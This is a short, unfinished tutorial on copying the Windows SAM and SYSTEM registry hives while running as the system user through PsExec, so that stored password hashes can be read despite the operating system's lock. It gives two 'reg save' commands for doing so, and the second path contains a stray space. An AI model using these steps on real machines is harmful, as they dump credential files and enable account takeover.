# READ CONTENT OF SAM FILE USING PSEXEC

## What is SAM file?

Security Account Manager (SAM) is a database file in Windows 11/10/8/7/XP that stores user passwords in encrypted form. It is usually located in the following directory:
(C:\Windows\system32\config). Sam file cannot be opened, copied or read while windows is running for security reasons. However, to bypass this hinderance using PSEXEC, we will follow the steps below.

### Step 1;

- Run the command prompt as the system user
- Enter the commnands below

  ```
  reg save hklm\sam C:\samcopy
  ```
  ```
  reg save hklm\system C:\system copy
  ```
  Note that C:\samcopy is the name of the path you want to save the copy of sam file & same goes for the system file
 - Check the location you entered, you will see your files there.
 - 
